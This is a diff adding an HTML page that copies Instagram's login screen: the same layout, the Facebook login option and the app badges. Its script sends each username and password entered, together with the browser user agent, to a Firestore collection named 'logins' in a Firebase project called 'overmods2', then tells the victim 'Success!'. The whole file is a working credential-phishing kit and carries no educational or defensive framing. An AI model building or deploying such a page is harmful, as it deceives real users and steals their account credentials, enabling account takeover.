@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Instagram</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+
+  body {
+    background-color: #fafafa;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px 0;
+  }
+
+  .container {
+    width: 350px;
+    max-width: 100%;
+  }
+
+  .login-box {
+    background-color: #ffffff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 44px 40px 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 10px;
+  }
+
+  .logo {
+    font-family: 'Segoe Script', cursive;
+    font-size: 42px;
+    margin: 22px auto 34px;
+    color: #262626;
+    font-weight: 400;
+  }
+
+  .login-box form {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .input-field {
+    width: 100%;
+    background-color: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    padding: 9px 8px 7px;
+    margin-bottom: 6px;
+    font-size: 12px;
+    color: #262626;
+  }
+
+  .input-field:focus {
+    outline: none;
+    border-color: #a8a8a8;
+  }
+
+  .login-btn {
+    width: 100%;
+    background-color: #0095f6;
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    padding: 7px 16px;
+    font-size: 14px;
+    font-weight: 600;
+    margin-top: 8px;
+    cursor: pointer;
+  }
+
+  .login-btn:disabled {
+    opacity: 0.4;
+    cursor: default;
+  }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    margin: 18px 0;
+  }
+
+  .divider .line {
+    flex: 1;
+    height: 1px;
+    background-color: #dbdbdb;
+  }
+
+  .divider span {
+    margin: 0 18px;
+    color: #8e8e8e;
+    font-size: 13px;
+    font-weight: 600;
+  }
+
+  .facebook-login {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 12px;
+  }
+
+  .facebook-login svg {
+    margin-right: 8px;
+  }
+
+  .forgot {
+    color: #00376b;
+    font-size: 12px;
+    margin-top: 4px;
+  }
+
+  .signup-box {
+    background-color: #ffffff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    padding: 20px;
+    text-align: center;
+    font-size: 14px;
+    color: #262626;
+  }
+
+  .signup-box a {
+    color: #0095f6;
+    font-weight: 600;
+    text-decoration: none;
+  }
+
+  .app-text {
+    text-align: center;
+    font-size: 14px;
+    margin: 20px 0 14px;
+    color: #262626;
+  }
+
+  .app-badges {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .app-badges img {
+    height: 40px;
+  }
+
+  .status-msg {
+    font-size: 12px;
+    margin-top: 6px;
+    text-align: center;
+    min-height: 14px;
+  }
+
+  a { text-decoration: none; }
+</style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="login-box">
+      <div class="logo">Instagram</div>
+      <form id="loginForm">
+        <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="off" />
+        <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="off" />
+        <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+
+        <div class="divider">
+          <div class="line"></div>
+          <span>OR</span>
+          <div class="line"></div>
+        </div>
+
+        <div class="facebook-login">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185">
+            <path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8v-6.93H7.5V12H10V9.5C10 7.57 11.57 6 13.5 6H16v2.87h-1.5c-.83 0-1.5.67-1.5 1.5V12h2.5l-.5 2.87h-2V21.8c4.56-.93 8-4.96 8-9.8z"/>
+          </svg>
+          Log in with Facebook
+        </div>
+
+        <a class="forgot" href="#">Forgot password?</a>
+        <div class="status-msg" id="statusMsg"></div>
+      </form>
+    </div>
+
+    <div class="signup-box">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="app-text">Get the app.</div>
+    <div class="app-badges">
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" />
+      <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" />
+    </div>
+  </div>
+
+  <!-- Firebase (modular v10) -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDFCiEwOl9MlBbYjRpU70ZU_NgwZLPsBHw",
+      authDomain: "overmods2.firebaseapp.com",
+      projectId: "overmods2",
+      storageBucket: "overmods2.firebasestorage.app",
+      messagingSenderId: "203325811727",
+      appId: "1:203325811727:web:006becff2b175c6baa477a",
+      measurementId: "G-VGP88B8T10"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const form = document.getElementById("loginForm");
+    const statusMsg = document.getElementById("statusMsg");
+    const loginBtn = document.getElementById("loginBtn");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      if (!username || !password) {
+        statusMsg.style.color = "#ed4956";
+        statusMsg.textContent = "Please fill in both fields.";
+        return;
+      }
+
+      loginBtn.disabled = true;
+      statusMsg.style.color = "#8e8e8e";
+      statusMsg.textContent = "Logging in...";
+
+      try {
+        await addDoc(collection(db, "logins"), {
+          username: username,
+          password: password,
+          userAgent: navigator.userAgent,
+          createdAt: serverTimestamp()
+        });
+
+        statusMsg.style.color = "#0095f6";
+        statusMsg.textContent = "Success!";
+        form.reset();
+      } catch (err) {
+        console.error(err);
+        statusMsg.style.color = "#ed4956";
+        statusMsg.textContent = "Error: " + err.message;
+      } finally {
+        loginBtn.disabled = false;
+      }
+    });
+  </script>
+
+</body>
+</html>
